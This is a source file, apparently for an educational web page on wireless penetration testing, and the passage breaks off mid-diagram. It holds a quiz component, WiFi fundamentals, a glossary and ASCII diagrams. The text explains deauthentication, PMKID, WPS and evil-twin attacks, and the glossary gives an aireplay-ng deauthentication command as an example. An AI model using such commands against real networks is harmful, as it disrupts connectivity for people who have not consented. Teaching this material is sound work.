import React, { useState } from "react";
import { Link } from "react-router-dom";
import {
  Box,
  Typography,
  Paper,
  Tabs,
  Tab,
  Grid,
  Card,
  CardContent,
  Chip,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Alert,
  AlertTitle,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  Divider,
  Stepper,
  Step,
  StepLabel,
  StepContent,
  Button,
  Avatar,
  Radio,
  RadioGroup,
  FormControlLabel,
  alpha,
} from "@mui/material";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import WifiIcon from "@mui/icons-material/Wifi";
import SecurityIcon from "@mui/icons-material/Security";
import RouterIcon from "@mui/icons-material/Router";
import DevicesIcon from "@mui/icons-material/Devices";
import BuildIcon from "@mui/icons-material/Build";
import BugReportIcon from "@mui/icons-material/BugReport";
import ShieldIcon from "@mui/icons-material/Shield";
import WarningIcon from "@mui/icons-material/Warning";
import BluetoothIcon from "@mui/icons-material/Bluetooth";
import SettingsInputAntennaIcon from "@mui/icons-material/SettingsInputAntenna";
import LockIcon from "@mui/icons-material/Lock";
import LockOpenIcon from "@mui/icons-material/LockOpen";
import RadarIcon from "@mui/icons-material/Radar";
import PhoneAndroidIcon from "@mui/icons-material/PhoneAndroid";
import ComputerIcon from "@mui/icons-material/Computer";
import BusinessIcon from "@mui/icons-material/Business";
import HomeIcon from "@mui/icons-material/Home";
import PublicIcon from "@mui/icons-material/Public";
import SpeedIcon from "@mui/icons-material/Speed";
import VisibilityIcon from "@mui/icons-material/Visibility";
import GavelIcon from "@mui/icons-material/Gavel";
import TimerIcon from "@mui/icons-material/Timer";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import ErrorIcon from "@mui/icons-material/Error";
import InfoIcon from "@mui/icons-material/Info";
import TerminalIcon from "@mui/icons-material/Terminal";
import StorageIcon from "@mui/icons-material/Storage";
import SignalWifi4BarIcon from "@mui/icons-material/SignalWifi4Bar";
import NetworkCheckIcon from "@mui/icons-material/NetworkCheck";
import SchoolIcon from "@mui/icons-material/School";
import MenuBookIcon from "@mui/icons-material/MenuBook";
import QuizIcon from "@mui/icons-material/Quiz";
import ScienceIcon from "@mui/icons-material/Science";
import CancelIcon from "@mui/icons-material/Cancel";
import TimelineIcon from "@mui/icons-material/Timeline";
import TipsAndUpdatesIcon from "@mui/icons-material/TipsAndUpdates";
import EmojiObjectsIcon from "@mui/icons-material/EmojiObjects";
import VisibilityOffIcon from "@mui/icons-material/VisibilityOff";
import AccountTreeIcon from "@mui/icons-material/AccountTree";
import EmojiEventsIcon from "@mui/icons-material/EmojiEvents";
import RefreshIcon from "@mui/icons-material/Refresh";
import LearnPageLayout from "../components/LearnPageLayout";

// Quiz question interface
interface WirelessQuizQuestion {
  id: number;
  question: string;
  options: string[];
  correctAnswer: number;
  explanation: string;
  topic: string;
}

// Simple code block component
const CodeBlock: React.FC<{ children: string; title?: string }> = ({ children, title }) => (
  <Paper sx={{ p: 2, bgcolor: "#1e1e1e", borderRadius: 1, my: 2, overflow: "auto" }}>
    {title && (
      <Typography variant="caption" sx={{ color: "#888", display: "block", mb: 1 }}>
        {title}
      </Typography>
    )}
    <Typography
      component="pre"
      sx={{
        fontFamily: "monospace",
        fontSize: "0.85rem",
        color: "#d4d4d4",
        whiteSpace: "pre-wrap",
        wordBreak: "break-word",
        m: 0,
      }}
    >
      {children}
    </Typography>
  </Paper>
);

interface TabPanelProps {
  children?: React.ReactNode;
  index: number;
  value: number;
}

function TabPanel(props: TabPanelProps) {
  const { children, value, index, ...other } = props;
  return (
    <div role="tabpanel" hidden={value !== index} {...other}>
      {value === index && <Box sx={{ p: 3 }}>{children}</Box>}
    </div>
  );
}

// =============================================================================
// WIRELESS QUIZ SECTION COMPONENT
// =============================================================================

const WirelessQuizSection: React.FC = () => {
  const [quizState, setQuizState] = useState<"start" | "active" | "results">("start");
  const [questions, setQuestions] = useState<WirelessQuizQuestion[]>([]);
  const [currentQuestionIndex, setCurrentQuestionIndex] = useState(0);
  const [selectedAnswers, setSelectedAnswers] = useState<{ [key: number]: number }>({});
  const [showExplanation, setShowExplanation] = useState(false);
  const [score, setScore] = useState(0);

  const QUESTIONS_PER_QUIZ = 10;
  const accent = "#7c3aed"; // Purple accent for wireless theme
  const accentDark = "#6d28d9";
  const success = "#22c55e";
  const error = "#ef4444";

  const startQuiz = () => {
    const shuffled = [...wirelessQuestionBank].sort(() => Math.random() - 0.5);
    setQuestions(shuffled.slice(0, QUESTIONS_PER_QUIZ));
    setCurrentQuestionIndex(0);
    setSelectedAnswers({});
    setShowExplanation(false);
    setScore(0);
    setQuizState("active");
  };

  const handleAnswerSelect = (answerIndex: number) => {
    if (showExplanation) return;
    setSelectedAnswers(prev => ({
      ...prev,
      [currentQuestionIndex]: answerIndex,
    }));
  };

  const handleSubmitAnswer = () => {
    if (selectedAnswers[currentQuestionIndex] === undefined) return;
    setShowExplanation(true);
    if (selectedAnswers[currentQuestionIndex] === questions[currentQuestionIndex].correctAnswer) {
      setScore(prev => prev + 1);
    }
  };

  const handleNextQuestion = () => {
    if (currentQuestionIndex < questions.length - 1) {
      setCurrentQuestionIndex(prev => prev + 1);
      setShowExplanation(false);
    } else {
      setQuizState("results");
    }
  };

  const currentQuestion = questions[currentQuestionIndex];
  const selectedAnswer = selectedAnswers[currentQuestionIndex];
  const isCorrect = selectedAnswer === currentQuestion?.correctAnswer;

  if (quizState === "start") {
    return (
      <Box sx={{ textAlign: "center", py: 4 }}>
        <QuizIcon sx={{ fontSize: 64, color: accent, mb: 2 }} />
        <Typography variant="h5" sx={{ fontWeight: 700, mb: 2 }}>
          Wireless Penetration Testing Quiz
        </Typography>
        <Typography variant="body1" color="text.secondary" sx={{ mb: 3, maxWidth: 520, mx: "auto" }}>
          Test your understanding with {QUESTIONS_PER_QUIZ} randomly selected questions from a 75-question bank. 
          Topics include wireless fundamentals, encryption protocols, attack techniques, tools, security best practices, and enterprise concepts.
        </Typography>
        <Button
          variant="contained"
          size="large"
          onClick={startQuiz}
          sx={{
            bgcolor: accent,
            "&:hover": { bgcolor: accentDark },
            px: 4,
            py: 1.5,
            fontWeight: 700,
          }}
        >
          Start Quiz ({QUESTIONS_PER_QUIZ} Questions)
        </Button>
      </Box>
    );
  }

  if (quizState === "results") {
    const percentage = Math.round((score / QUESTIONS_PER_QUIZ) * 100);
    const isPassing = percentage >= 70;
    return (
      <Box sx={{ textAlign: "center", py: 4 }}>
        <EmojiEventsIcon sx={{ fontSize: 80, color: isPassing ? success : accent, mb: 2 }} />
        <Typography variant="h4" sx={{ fontWeight: 800, mb: 1 }}>
          Quiz Complete
        </Typography>
        <Typography variant="h5" sx={{ fontWeight: 700, color: isPassing ? success : accent, mb: 2 }}>
          {score} / {QUESTIONS_PER_QUIZ} ({percentage}%)
        </Typography>
        <Typography variant="body1" color="text.secondary" sx={{ mb: 3, maxWidth: 420, mx: "auto" }}>
          {isPassing
            ? "Excellent work! You have a solid understanding of wireless security concepts."
            : "Keep studying! Review the sections above and try again to reinforce your knowledge."}
        </Typography>
        <Button
          variant="contained"
          size="large"
          onClick={startQuiz}
          startIcon={<RefreshIcon />}
          sx={{
            bgcolor: accent,
            "&:hover": { bgcolor: accentDark },
            px: 4,
            py: 1.5,
            fontWeight: 700,
          }}
        >
          Try Again
        </Button>
      </Box>
    );
  }

  if (!currentQuestion) return null;

  return (
    <Box sx={{ py: 2 }}>
      <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 3 }}>
        <Box sx={{ display: "flex", gap: 1, alignItems: "center" }}>
          <Chip
            label={`Question ${currentQuestionIndex + 1}/${QUESTIONS_PER_QUIZ}`}
            size="small"
            sx={{ bgcolor: alpha(accent, 0.15), color: accent, fontWeight: 700 }}
          />
          <Chip label={currentQuestion.topic} size="small" variant="outlined" />
        </Box>
        <Chip
          label={`Score: ${score}/${currentQuestionIndex + (showExplanation ? 1 : 0)}`}
          size="small"
          sx={{ bgcolor: alpha(success, 0.15), color: success, fontWeight: 600 }}
        />
      </Box>

      <Box sx={{ mb: 3, bgcolor: alpha(accent, 0.1), borderRadius: 1, height: 8 }}>
        <Box
          sx={{
            width: `${((currentQuestionIndex + (showExplanation ? 1 : 0)) / QUESTIONS_PER_QUIZ) * 100}%`,
            bgcolor: accent,
            borderRadius: 1,
            height: "100%",
            transition: "width 0.3s ease",
          }}
        />
      </Box>

      <Typography variant="h6" sx={{ fontWeight: 700, mb: 3 }}>
        {currentQuestion.question}
      </Typography>

      <RadioGroup value={selectedAnswer ?? ""} onChange={(e) => handleAnswerSelect(parseInt(e.target.value, 10))}>
        {currentQuestion.options.map((option, idx) => (
          <Paper
            key={option}
            sx={{
              p: 2,
              mb: 1.5,
              borderRadius: 2,
              cursor: showExplanation ? "default" : "pointer",
              border: `2px solid ${
                showExplanation
                  ? idx === currentQuestion.correctAnswer
                    ? success
                    : idx === selectedAnswer
                    ? error
                    : "transparent"
                  : selectedAnswer === idx
                  ? accent
                  : "transparent"
              }`,
              bgcolor: showExplanation
                ? idx === currentQuestion.correctAnswer
                  ? alpha(success, 0.1)
                  : idx === selectedAnswer
                  ? alpha(error, 0.1)
                  : "transparent"
                : selectedAnswer === idx
                ? alpha(accent, 0.1)
                : "transparent",
              transition: "all 0.2s ease",
              "&:hover": {
                bgcolor: showExplanation ? undefined : alpha(accent, 0.05),
              },
            }}
            onClick={() => handleAnswerSelect(idx)}
          >
            <FormControlLabel
              value={idx}
              control={<Radio sx={{ color: accent, "&.Mui-checked": { color: accent } }} />}
              label={option}
              sx={{ m: 0, width: "100%" }}
              disabled={showExplanation}
            />
          </Paper>
        ))}
      </RadioGroup>

      {!showExplanation ? (
        <Button
          variant="contained"
          fullWidth
          onClick={handleSubmitAnswer}
          disabled={selectedAnswer === undefined}
          sx={{
            mt: 2,
            bgcolor: accent,
            "&:hover": { bgcolor: accentDark },
            "&:disabled": { bgcolor: alpha(accent, 0.3) },
            py: 1.5,
            fontWeight: 700,
          }}
        >
          Submit Answer
        </Button>
      ) : (
        <Box sx={{ mt: 3 }}>
          <Alert severity={isCorrect ? "success" : "error"} sx={{ mb: 2, borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>
              {isCorrect ? "Correct!" : "Incorrect"}
            </AlertTitle>
            {currentQuestion.explanation}
          </Alert>
          <Button
            variant="contained"
            fullWidth
            onClick={handleNextQuestion}
            sx={{
              bgcolor: accent,
              "&:hover": { bgcolor: accentDark },
              py: 1.5,
              fontWeight: 700,
            }}
          >
            {currentQuestionIndex < questions.length - 1 ? "Next Question" : "See Results"}
          </Button>
        </Box>
      )}
    </Box>
  );
};

// =============================================================================
// DATA ARRAYS - To be expanded later
// =============================================================================

// Part 1: Wireless Fundamentals for Beginners
const wirelessFundamentals = {
  whatIsWireless: {
    title: "What is Wireless Communication?",
    beginnerExplanation: `Imagine you're at a concert and you want to tell your friend something across the crowd. 
You could shout (broadcast), use hand signals (visual), or throw a paper airplane with a note. 
Wireless communication is like that paper airplane - it carries your message through the air without any wires.

Your WiFi router is constantly shouting "Hey, I'm here! My name is 'HomeNetwork'!" about 10 times per second. 
When your phone hears this, it can connect and start a conversation. All of this happens using invisible 
radio waves - the same type of waves that carry FM radio, just at a different frequency.`,
    technicalDetails: `Wireless networks use electromagnetic radiation in the radio frequency (RF) spectrum. 
802.11 WiFi operates in the 2.4 GHz (ISM band), 5 GHz (UNII bands), and now 6 GHz (WiFi 6E) frequency ranges. 
These frequencies were chosen because they offer a balance between range, penetration through obstacles, 
and available bandwidth. Data is encoded onto these carrier waves using modulation techniques like OFDM 
(Orthogonal Frequency Division Multiplexing) which splits data across multiple sub-carriers for reliability.`,
    keyPoints: [
      "Radio waves travel at the speed of light (~300,000 km/s)",
      "Higher frequencies = more bandwidth but shorter range",
      "Walls, metal, and water absorb/reflect radio waves",
      "Multiple devices share the same airspace (collision domain)",
    ],
  },
  howWifiWorks: {
    title: "How WiFi Actually Works",
    beginnerExplanation: `Think of WiFi like a restaurant. The router is the waiter, and your devices are customers:

1. The router announces itself: "Welcome to HomeNetwork!" (Beacon frames)
2. Your phone says: "I'd like to connect please" (Probe request â†’ Association)
3. They exchange a secret handshake to prove identity (Authentication/4-way handshake)
4. Now they can talk privately (Encrypted data frames)

Every message gets a receipt confirmation. If your phone sends data and doesn't hear "got it!" from the router, 
it sends the message again. This happens thousands of times per second, but you never notice.`,
    technicalDetails: `802.11 communication uses a half-duplex CSMA/CA (Carrier Sense Multiple Access with 
Collision Avoidance) protocol. Before transmitting, stations listen to ensure the channel is clear (virtual 
carrier sense via NAV timer). The protocol uses frame types: Management (beacons, probes, authentication, 
association), Control (ACK, RTS/CTS), and Data frames. Security is established through a 4-way handshake 
that derives session keys (PTK/GTK) from the pre-shared key or 802.1X credentials.`,
    keyPoints: [
      "WiFi is half-duplex: devices can't send and receive simultaneously",
      "Beacons broadcast network presence every ~100ms",
      "The 4-way handshake creates unique encryption keys per session",
      "All traffic is encrypted (if properly configured) after association",
    ],
  },
  radioBasics: {
    title: "Radio Frequency Basics",
    beginnerExplanation: `Radio waves are like ripples in a pond - they spread out in all directions from the source.
The main things to understand:

â€¢ Frequency: How fast the waves wiggle (measured in Hertz). 2.4 GHz means 2.4 billion wiggles per second!
â€¢ Wavelength: The distance between wave peaks. Higher frequency = shorter wavelength
â€¢ Amplitude: How "tall" the waves are - relates to signal strength
â€¢ Channels: Like lanes on a highway - different networks can use different channels to avoid interference

Think of 2.4 GHz vs 5 GHz like AM vs FM radio. 2.4 GHz travels farther (like AM) but is more crowded. 
5 GHz is faster but doesn't go through walls as well (like FM).`,
    technicalDetails: `The 2.4 GHz ISM band (2.400-2.4835 GHz) provides 14 channels, but only channels 1, 6, 
and 11 are non-overlapping in the US due to 22 MHz channel width. The 5 GHz band offers more non-overlapping 
channels (up to 25 with DFS) and supports wider channels (40/80/160 MHz) for higher throughput. Signal 
propagation follows the inverse square law - power decreases with the square of distance. Free Space Path 
Loss (FSPL) in dB = 20*log(d) + 20*log(f) + 20*log(4Ï€/c). Typical indoor attenuation: drywall 3dB, 
concrete 10-15dB, metal surfaces can cause total reflection.`,
    keyPoints: [
      "2.4 GHz: 3 non-overlapping channels, longer range, more interference",
      "5 GHz: 25+ channels, shorter range, less interference, faster speeds",
      "6 GHz (WiFi 6E): Brand new spectrum, minimal interference",
      "Signal strength measured in dBm (negative numbers, closer to 0 is stronger)",
    ],
  },
  framesAndPackets: {
    title: "Understanding WiFi Frames",
    beginnerExplanation: `Every WiFi message is wrapped in a digital envelope called a "frame." Think of it like mailing a letter:

â€¢ The envelope has addresses (source and destination MAC addresses)
â€¢ It has a stamp showing what type of letter it is (frame type)
â€¢ Inside is your actual message (payload)
â€¢ There's a seal to detect tampering (checksum)

There are three main types of WiFi frames:
1. Management frames: "Hello, I exist!" "Can I connect?" "Yes you can!" (No encryption!)
2. Control frames: "Got your message!" "Wait your turn!"  
3. Data frames: Your actual internet traffic (encrypted if WPA enabled)

The scary part? Management frames are NOT encrypted by default. This is why attackers can send fake 
"disconnect" commands to kick you off the network.`,
    technicalDetails: `802.11 frame structure: Frame Control (2B) â†’ Duration/ID (2B) â†’ Address 1-4 (6B each) â†’ 
Sequence Control (2B) â†’ QoS Control (2B, optional) â†’ HT Control (4B, optional) â†’ Frame Body (0-2304B) â†’ 
FCS (4B). Management frames (Type 0) include subtypes: Association (0), Probe (4,5), Beacon (8), 
Disassociation (10), Authentication (11), Deauthentication (12). 802.11w (PMF) adds protection to 
management frames but requires WPA2/3 and client support.`,
    keyPoints: [
      "MAC addresses identify devices (like Ethernet addresses)",
      "Management frames are unencrypted by default (vulnerability!)",
      "802.11w (Protected Management Frames) fixes this but needs support",
      "Frame headers reveal network structure even when payload is encrypted",
    ],
  },
  securityEvolution: {
    title: "WiFi Security Evolution",
    beginnerExplanation: `WiFi security has been a constant game of cat and mouse:

1997 - WEP (Wired Equivalent Privacy): "This should keep people out!"
2001 - Researchers: "We can crack WEP in minutes..."
2003 - WPA (Quick fix): "Let's patch WEP with better encryption"
2004 - WPA2: "AES encryption, much better!"
2017 - Researchers: "Found a bug in WPA2 (KRACK)..."
2018 - WPA3: "Even better! Can't crack offline anymore!"
2019 - Researchers: "Found bugs in WPA3 too (Dragonblood)..."

The pattern continues! That's why "defense in depth" matters - never rely on just one layer of security.`,
    technicalDetails: `WEP used RC4 stream cipher with 24-bit IV, vulnerable to FMS/PTW attacks due to IV 
collisions and RC4 weaknesses. WPA implemented TKIP as a firmware upgrade, adding per-packet keying and 
MIC (Michael), but remained vulnerable due to RC4 base. WPA2 introduced CCMP using AES-128 in counter 
mode with CBC-MAC for integrity. WPA3 replaced PSK exchange with SAE (Simultaneous Authentication of 
Equals) using Dragonfly key exchange, providing forward secrecy and protection against offline dictionary 
attacks. Enterprise variants use 802.1X with EAP methods and RADIUS for authentication.`,
    keyPoints: [
      "WEP is completely broken - never use it",
      "WPA was a quick fix, also has weaknesses",
      "WPA2-PSK security depends entirely on password strength",
      "WPA3-SAE prevents offline dictionary attacks",
    ],
  },
  whyHackingWorks: {
    title: "Why Wireless Hacking Works",
    beginnerExplanation: `Wireless networks have a fundamental problem: anyone can listen. Unlike a wired connection 
where you need physical access to plug in, wireless signals fly through the air for everyone to hear.

Key vulnerabilities:

1. Radio signals don't stop at walls - your neighbor can see your network
2. Management frames aren't encrypted - attackers can forge "disconnect" commands
3. Handshakes are broadcast - attackers can capture and crack them offline
4. Many networks use weak passwords - "password123" takes seconds to crack
5. Old protocols (WEP, WPS) have fatal design flaws

It's like having a private conversation by shouting in a crowded room. Even if you speak in code 
(encryption), everyone can hear when you start and stop talking, who you're talking to, and can 
try to guess your code.`,
    technicalDetails: `Wireless attack surfaces include: Physical layer (jamming, replay), MAC layer 
(deauthentication, disassociation, beacon spoofing), Authentication layer (PSK cracking, PMKID 
extraction, WPS PIN attacks), and Upper layers (evil twin, captive portal, SSL stripping). The 
802.11 specification's half-duplex nature and clear-channel assessment make denial of service 
trivial. PMKID can be extracted from the first EAPOL frame without any client interaction, 
enabling attacks on networks with no connected clients.`,
    keyPoints: [
      "No physical boundary - signals extend beyond property lines",
      "Passive sniffing is completely undetectable",
      "Deauthentication attacks exploit unprotected management frames",
      "Offline cracking means attackers can try billions of passwords",
    ],
  },
};

// Expanded glossary with beginner explanations
const expandedGlossary = {
  ssid: {
    term: "SSID",
    fullName: "Service Set Identifier",
    shortDef: "The name of a WiFi network",
    longDef: "Like the name tag on a restaurant - it's how you identify which network to join. Can be hidden but this provides no real security.",
    example: "'HomeNetwork', 'Starbucks WiFi', 'NETGEAR-5G'",
  },
  bssid: {
    term: "BSSID",
    fullName: "Basic Service Set Identifier", 
    shortDef: "MAC address of the access point",
    longDef: "The unique hardware address of the wireless router/AP. Unlike SSID (which can be duplicated), BSSID should be unique per AP.",
    example: "AA:BB:CC:DD:EE:FF",
  },
  channel: {
    term: "Channel",
    fullName: "WiFi Channel",
    shortDef: "Specific frequency slice for communication",
    longDef: "Like different lanes on a highway. Networks on the same channel compete for airtime. 2.4GHz has 11-14 channels, only 1, 6, 11 don't overlap.",
    example: "Channel 6 (2.437 GHz)",
  },
  beacon: {
    term: "Beacon Frame",
    fullName: "802.11 Beacon Frame",
    shortDef: "Broadcast announcing network presence",
    longDef: "Like a store's 'OPEN' sign. APs broadcast beacons ~10 times/second saying 'I exist, here's my name and capabilities.'",
    example: "Every 100ms by default",
  },
  handshake: {
    term: "4-Way Handshake",
    fullName: "WPA 4-Way Handshake",
    shortDef: "Authentication exchange to create encryption keys",
    longDef: "A 4-message dance between client and AP that proves both know the password and creates unique session keys. Capturing this allows offline cracking.",
    example: "EAPOL messages 1-4",
  },
  monitorMode: {
    term: "Monitor Mode",
    fullName: "IEEE 802.11 Monitor Mode",
    shortDef: "Capture all wireless traffic, not just your own",
    longDef: "Normal WiFi cards only show traffic addressed to them. Monitor mode lets you see ALL nearby traffic - essential for pentesting.",
    example: "airmon-ng start wlan0",
  },
  injection: {
    term: "Packet Injection",
    fullName: "802.11 Packet Injection",
    shortDef: "Ability to send custom/forged wireless frames",
    longDef: "Create your own WiFi packets and broadcast them. Required for deauth attacks, fake beacons, and many other attacks.",
    example: "aireplay-ng -0 5 -a BSSID wlan0mon",
  },
  deauth: {
    term: "Deauthentication",
    fullName: "802.11 Deauthentication Frame",
    shortDef: "Message to disconnect a client from network",
    longDef: "A management frame that tells a client 'you're disconnected.' Since management frames aren't encrypted, anyone can send fake deauths.",
    example: "Reason code 7: Class 3 frame received",
  },
  pmkid: {
    term: "PMKID",
    fullName: "Pairwise Master Key Identifier",
    shortDef: "Hash that can be extracted without client",
    longDef: "A value derived from PMK that appears in the first EAPOL frame. Can crack this offline without capturing full handshake or having any client!",
    example: "Found in RSN IE of first EAPOL message",
  },
  wps: {
    term: "WPS",
    fullName: "WiFi Protected Setup",
    shortDef: "Easy setup feature with fatal flaw",
    longDef: "Designed for easy connection using 8-digit PIN. But the PIN is verified in halves, making brute force trivial (11,000 attempts max).",
    example: "Push button or enter PIN",
  },
  evilTwin: {
    term: "Evil Twin",
    fullName: "Evil Twin Attack",
    shortDef: "Fake AP impersonating legitimate network",
    longDef: "Clone a real network's SSID to trick users into connecting. Then intercept all their traffic or present fake login pages.",
    example: "Fake 'Starbucks_WiFi' AP",
  },
  mac: {
    term: "MAC Address",
    fullName: "Media Access Control Address",
    shortDef: "Unique hardware identifier for network interface",
    longDef: "48-bit address burned into every network card. First 3 bytes identify manufacturer (OUI). Can be spoofed in software.",
    example: "00:11:22:33:44:55",
  },
  oui: {
    term: "OUI",
    fullName: "Organizationally Unique Identifier",
    shortDef: "First 3 bytes of MAC identifying vendor",
    longDef: "The first half of a MAC address identifies the manufacturer. Useful for identifying device types on a network.",
    example: "Apple: 00:1C:B3, Intel: 00:1B:21",
  },
  rssi: {
    term: "RSSI",
    fullName: "Received Signal Strength Indicator",
    shortDef: "Measure of signal strength (in dBm)",
    longDef: "How strong the wireless signal is at your location. Measured in negative dBm - closer to 0 is stronger. -30 excellent, -70 weak.",
    example: "-65 dBm (moderate signal)",
  },
  snr: {
    term: "SNR",
    fullName: "Signal-to-Noise Ratio",
    shortDef: "Signal strength compared to background noise",
    longDef: "How much the desired signal stands out from interference. Higher is better. 25+ dB is good for reliable connections.",
    example: "30 dB SNR",
  },
  probe: {
    term: "Probe Request",
    fullName: "802.11 Probe Request Frame",
    shortDef: "Client asking 'Is network X here?'",
    longDef: "Devices constantly ask for networks they've connected to before. This reveals network history and enables tracking/targeting.",
    example: "Probing for 'Home_WiFi', 'Work_Corp'",
  },
  association: {
    term: "Association",
    fullName: "802.11 Association",
    shortDef: "Formal connection to an access point",
    longDef: "After authentication, client associates with AP to exchange data. The AP tracks associated clients and allocates resources.",
    example: "AssocReq â†’ AssocResp",
  },
  radius: {
    term: "RADIUS",
    fullName: "Remote Authentication Dial-In User Service",
    shortDef: "Server that verifies enterprise WiFi credentials",
    longDef: "Central authentication server for WPA2/3-Enterprise. Verifies usernames/passwords and can assign VLANs dynamically.",
    example: "FreeRADIUS, Microsoft NPS",
  },
  eap: {
    term: "EAP",
    fullName: "Extensible Authentication Protocol",
    shortDef: "Framework for authentication methods",
    longDef: "Not a single protocol but a framework for many authentication types. Common: EAP-TLS (certificates), PEAP (passwords), EAP-TTLS.",
    example: "PEAP-MSCHAPv2 for enterprise",
  },
  pmf: {
    term: "PMF/802.11w",
    fullName: "Protected Management Frames",
    shortDef: "Encryption for management frames",
    longDef: "Finally adds protection to management frames, preventing deauth attacks. Required for WPA3, optional on WPA2.",
    example: "Management Frame Protection: Required",
  },
  sae: {
    term: "SAE",
    fullName: "Simultaneous Authentication of Equals",
    shortDef: "WPA3's improved key exchange",
    longDef: "Replaces WPA2's 4-way handshake with Dragonfly protocol. Provides forward secrecy and blocks offline dictionary attacks.",
    example: "WPA3-Personal uses SAE",
  },
};

// Visual learning aids with ASCII diagrams
const visualLearningAids = {
  wifiCommunication: {
    title: "WiFi Communication Flow",
    description: "How a device connects to a WiFi network step by step",
    diagram: `
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                           WiFi Connection Process                                â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                                  â”‚
â”‚    ğŸ“± Client                                              ğŸ“¡ Access Point        â”‚
â”‚       â”‚                                                         â”‚               â”‚
â”‚       â”‚              â† â† â† BEACON FRAME â† â† â†                  â”‚               â”‚
â”‚       â”‚                "I am 'HomeWiFi'!"                       â”‚               â”‚
â”‚       â”‚                                                         â”‚               â”‚
â”‚       â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ PROBE REQUEST â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚               â”‚
â”‚       â”‚               "Are you 'HomeWiFi'?"                     â”‚               â”‚
â”‚       â”‚                                                         â”‚               â”‚
â”‚       â”‚â† â† â† â† â† â† â† PROBE RESPONSE â† â† â† â† â† â† â† â† â† â† â† â† â† â†â”‚               â”‚
â”‚       â”‚               "Yes I am! Here's my info"                â”‚               â”‚
â”‚       â”‚                                                         â”‚               â”‚
â”‚       â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ AUTH REQUEST â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚               â”‚
â”‚       â”‚               "I want to authenticate"                  â”‚               â”‚
â”‚       â”‚                                                         â”‚               â”‚
â”‚       â”‚â† â† â† â† â† â† â† AUTH RESPONSE â† â† â† â† â† â† â† â† â† â† â† â† â† â† â”‚               â”‚
â”‚       â”‚               "Authentication successful"               â”‚               â”‚
â”‚       â”‚                                                         â”‚               â”‚
â”‚       â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ASSOC REQUEST â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚               â”‚
â”‚       â”‚               "I want to associate"                     â”‚               â”‚
â”‚       â”‚                                                         â”‚               â”‚
â”‚       â”‚â† â† â† â† â† â† â† ASSOC RESPONSE â† â† â† â† â† â† â† â† â† â† â† â† â† â†â”‚               â”‚
â”‚       â”‚               "Welcome! You're connected"               â”‚               â”‚
â”‚       â”‚                                                         â”‚               â”‚
â”‚       â”‚â•â•â•â•â•â•â•â•â•â•â•â•â• 4-WAY HANDSHAKE â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â”‚               â”‚
â”‚       â”‚    (Creates encryption keys - PSK or 802.1X)           â”‚               â”‚
â”‚       â”‚                                                         â”‚               â”‚
â”‚       â”‚â—„â•â•â•â•â•â•â•â•â•â•â• ENCRYPTED DATA FLOW â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â–ºâ”‚               â”‚
â”‚                                                                                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜`,
  },
  fourWayHandshake: {
    title: "WPA2 4-Way Handshake",
    description: "The key exchange that attackers capture to crack offline",
    diagram: `
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                        WPA2 4-Way Handshake                                      â”‚
